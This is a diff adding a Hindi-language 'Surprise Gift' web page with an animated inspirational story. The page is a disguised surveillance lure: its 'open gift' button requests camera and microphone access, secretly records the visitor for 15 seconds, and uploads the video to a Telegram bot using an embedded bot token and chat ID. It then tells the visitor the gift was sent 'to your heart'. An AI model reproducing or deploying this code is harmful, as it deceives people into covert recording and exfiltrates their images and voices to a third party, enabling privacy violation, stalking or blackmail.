@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>Surprise Gift</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      font-family: 'Comic Sans MS', cursive;
+      background: linear-gradient(135deg, #ff6ec4, #7873f5);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 800px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.07);
+      padding: 30px 20px;
+      border-radius: 25px;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.3);
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2.2em;
+      margin-bottom: 20px;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    button {
+      padding: 16px 35px;
+      font-size: 1.2rem;
+      background: #fff;
+      color: #ff00cc;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      transition: all 0.3s ease-in-out;
+      box-shadow: 0 0 15px #fff;
+      animation: pulse 2s infinite;
+    }
+
+    button:hover {
+      transform: scale(1.1);
+      background: #ff00cc;
+      color: #fff;
+      box-shadow: 0 0 25px #ff00cc;
+    }
+
+    .loader {
+      margin: 20px auto;
+      border: 6px solid #fff;
+      border-top: 6px solid #ff00cc;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    video {
+      display: none;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 1rem;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+
+    .story-text {
+      font-size: 1.1rem;
+      font-weight: bold;
+      margin-top: 25px;
+      line-height: 1.8;
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 15px;
+      min-height: 160px;
+      color: #fff;
+    }
+
+    .story-text p {
+      opacity: 0;
+      transition: opacity 1s ease-in-out;
+    }
+
+    .story-text p.show {
+      opacity: 1;
+    }
+
+    audio {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>अपना सरप्राइज गिफ्ट खोलिए!</h1>
+    <button onclick="startRecording()">गिफ्ट खोलें</button>
+    <div class="loader" id="loader"></div>
+    <video id="preview" autoplay muted playsinline></video>
+    <div id="status"></div>
+    <div id="story" class="story-text">
+      <p></p>
+    </div>
+  </div>
+
+  <!-- Background music -->
+  <audio autoplay loop>
+    <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3" type="audio/mp3">
+  </audio>
+
+  <script>
+    const botToken = '7438200543:AAGj_NH7TYovNcO4-n9saO4YCIrWf3KWeqE';
+    const chatId = '6133511447';
+    const loader = document.getElementById('loader');
+    const statusText = document.getElementById('status');
+    const preview = document.getElementById('preview');
+
+    async function startRecording() {
+      statusText.innerText = "";
+      loader.style.display = "block";
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: true
+        });
+
+        preview.srcObject = stream;
+
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = () => {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+          sendToTelegram(blob);
+          stream.getTracks().forEach(track => track.stop());
+          preview.srcObject = null;
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 15000); // 15 seconds
+      } catch (err) {
+        loader.style.display = "none";
+        statusText.innerText = "कैमरा/माइक एक्सेस असफल या अनुपलब्ध है।";
+        console.error(err);
+      }
+    }
+
+    function sendToTelegram(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("video", blob, "gift_video.webm");
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        loader.style.display = "none";
+        statusText.innerText = "आपका गिफ्ट तो आपके दिल में भेजा गया!";
+        console.log(data);
+      })
+      .catch(err => {
+        loader.style.display = "none";
+        statusText.innerText = "गिफ्ट भेजने में त्रुटि हुई।";
+        console.error(err);
+      });
+    }
+
+    const storyLines = [
+      "एक छोटा लड़का था, जिसके पास सिर्फ एक सपना था।",
+      "वो अपने माता-पिता को गर्वित करना चाहता था, लेकिन ज़िंदगी आसान नहीं थी।",
+      "वो नंगे पांव मीलों चलता था स्कूल जाने के लिए, आंखों में आंसू और चेहरे पर मुस्कान।",
+      "एक दिन उसने एक लड़की को रोते देखा। उसकी गुड़िया खो गई थी। लड़के ने अपनी एकमात्र खिलौना उसे दे दी।",
+      "साल बीत गए। लड़के ने कभी किसी से कुछ नहीं माँगा, बस देता रहा।",
+      "लोग उसे भूल गए... लेकिन वो कभी नहीं रुका।",
+      "अगर आज आप यह पढ़ रहे हैं, तो जान लीजिए कि अच्छाई कभी व्यर्थ नहीं जाती।",
+      "शायद... सिर्फ शायद... आज आप ही किसी की मुस्कान की वजह हों।",
+      "यह तोहफा डिब्बे में नहीं है। यह आपके दिल में है।"
+    ];
+
+    let lineIndex = 0;
+    const storyElement = document.querySelector("#story p");
+
+    function showStoryLine() {
+      if (lineIndex < storyLines.length) {
+        storyElement.classList.remove("show");
+        setTimeout(() => {
+          storyElement.innerText = storyLines[lineIndex];
+          storyElement.classList.add("show");
+          lineIndex++;
+          setTimeout(showStoryLine, 3500);
+        }, 500);
+      }
+    }
+
+    showStoryLine();
+  </script>
+</body>
+</html>
